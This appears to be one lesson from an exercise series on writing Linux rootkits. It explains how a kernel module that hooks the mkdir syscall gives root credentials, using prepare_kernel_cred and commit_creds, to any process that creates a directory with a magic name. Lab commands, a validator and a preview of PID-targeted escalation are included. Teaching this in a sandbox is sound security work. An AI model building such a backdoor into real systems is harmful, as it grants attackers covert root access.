# L06: Elevate the Calling Process

L05 recognized a `mkdir` name and returned an error.
This exercise maps the exact name `rklings.e` to a credential change inside the
process executing that system call.

## What you will observe

The supplied guest helper starts with UID 1000, invokes `mkdir` itself, and
prints its UID after the syscall returns:

```console
root@victim:~# su student -c \
> 'mkdir_escalation_test /tmp/rklings.e'
0
```

A different directory name leaves the same helper unprivileged:

```console
root@victim:~# su student -c \
> 'mkdir_escalation_test /tmp/rklings.other'
1000
```

## Workspace

The interception layer and its lifecycle are carried forward from L05.
Only the callback in `main.c` is incomplete.

Read the process and credential model below before filling that TODO.

## Identify which process changes

In kernel code, `current` identifies the task running on the current CPU.
During the intercepted call, that is the process that invoked `mkdir`:

```text
mkdir_escalation_test                    kernel
        |
        +-- starts with uid 1000
        +-- mkdir("/tmp/rklings.e") -------> current
        |                                      |
        |                                      +-- replace credentials
        |
        +-- syscall returns with uid 0
```

This does not change an unrelated process.
It also does not change the parent shell when the shell launches
`/usr/bin/mkdir` as a child:

```text
interactive shell (parent, uid 1000)
        |
        +-- /usr/bin/mkdir (child, uid 1000)
                    | intercepted and elevated
                    +-- exits

interactive shell remains uid 1000
```

L07 adds deliberate parent-shell and explicit-PID targeting.

## Understand credentials

Every task points to a kernel `struct cred` containing its user IDs, group IDs,
capabilities, and related security state.
Permission checks read that credential object.

Do not edit the existing object field by field.
Create a complete credential set and publish it with the kernel helper:

```c
new_cred = prepare_kernel_cred(&init_task);
if (!new_cred)
	return -ENOMEM;

commit_creds(new_cred);
```

`init_task` is the kernel's initial task, PID 0, with privileged credentials.
`prepare_kernel_cred` allocates a new credential object derived from that task.
It returns `NULL` when allocation fails.

`commit_creds` installs the prepared object on `current` and manages the old
credential references.
After it returns, later permission checks for the calling process see UID 0 and
the privileged capability set.

```text
before commit_creds                 after commit_creds

current --> cred(uid=1000)          current --> new cred(uid=0)
                  ^                                  |
                  +-- old reference released        +-- now active
```

The prepared credential is consumed by `commit_creds`.
Do not free it after a successful commit.

## Match only the complete command

Use `strcmp(name, "rklings.e")` rather than a prefix comparison:

```text
rklings.e        match
rklings.e.1234   no match in this lesson
rklings.extra    no match
ordinary         no match
```

Return `0` for non-matching names so their directory creation proceeds normally.
After a successful intercepted command, log the current PID and return `-ENOENT`
so `/tmp/rklings.e` is not created.

## Implement it

In the supplied `RK_ON_MKDIR` callback:

1. Return `0` unless `name` is exactly `rklings.e`.
2. Prepare credentials from `init_task`.
3. Return `-ENOMEM` if preparation fails.
4. Commit the new credentials to `current`.
5. Log `rklings: escalated pid <pid> to root`.
6. Return `-ENOENT` to suppress the requested directory.

Leave the supplied hook lifecycle unchanged.

## Test it

Build the module and enter the student VM:

```console
$ ./rklings run L06
```

The runner loads the module before opening the shell.
Use the guest helper to keep the syscall and UID check in the same process:

```console
student@victim:~$ mkdir_escalation_test /tmp/rklings.e
0
student@victim:~$ dmesg | tail -1
dmesg: read kernel buffer failed: Operation not permitted
```

The student cannot read `dmesg` directly.
Open a root shell from another host terminal when you want to inspect the log:

```console
$ ./rklings ssh root
root@victim:~# dmesg | tail -1
rklings: escalated pid 1234 to root
```

Test the negative path as the student:

```console
student@victim:~$ mkdir_escalation_test /tmp/rklings.other
1000
```

## Validate

From the repository root:

```console
$ ./rklings validate L06
```

The checks load the module, invoke matching and non-matching calls as UID 1000,
verify the resulting UID, inspect the escalation log, and unload the module.

## Next

`commit_creds` can change only `current`.
L07 resolves another live task by PID, which makes parent-shell and explicit
process targeting possible.
